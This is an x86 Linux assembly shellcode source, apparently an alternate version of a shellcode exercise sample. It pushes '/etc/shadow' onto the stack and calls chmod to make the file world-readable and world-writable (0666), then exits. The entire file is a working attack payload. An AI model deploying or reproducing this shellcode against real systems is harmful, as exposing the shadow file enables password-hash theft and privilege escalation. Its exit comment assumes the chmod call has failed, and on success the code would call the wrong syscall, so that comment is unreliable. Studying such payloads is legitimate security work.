; Name; asm_linx86_chmod_sample2-alt.asm
; Author hodorsec

global _start
section .text

_start:
	; Clear registers
	xor eax, eax			; Clearing for EAX
	mov ecx, eax			; Clear for ECX

	; String "/etc/shadow"
	push eax			; Push NULL in EAX on stack to terminate string
	push 0x776f6461 		; woda
	push 0x68732f2f 		; hs//
	push 0x6374652f 		; cte/

	; sys_chmod
	; int chmod(const char *path, mode_t mode);
	; push dword 0x1b6 		; Octal representation of 0666
	; mov cl, 0xb6
	; mov ch, 0x1
	; pop ecx				; Put permission value in ECX for mode argument
	mov ebx, esp			; Store stack-pointer in EBX for pointer argument for path
	mov cx, 0x1b6			; Octal representation of 0666 for mode argument
	; push byte +0xf			; Value of 15
	; pop eax				; Put value for syscall sys_chmod in EAX
	mov al, 0xf			; Put value for syscall 15 sys_chmod in AL (EAX)
	int 0x80			; Syscall

	; sys_exit
	; void exit(int status);
	; push 0x1			; Push 1 for exit on stack
	; pop eax				; Put in EAX for syscall
	add eax, 2			; EAX was 0xffffffff after last syscall, increment by 2 to rollover to 1
	int 0x80			; Syscall

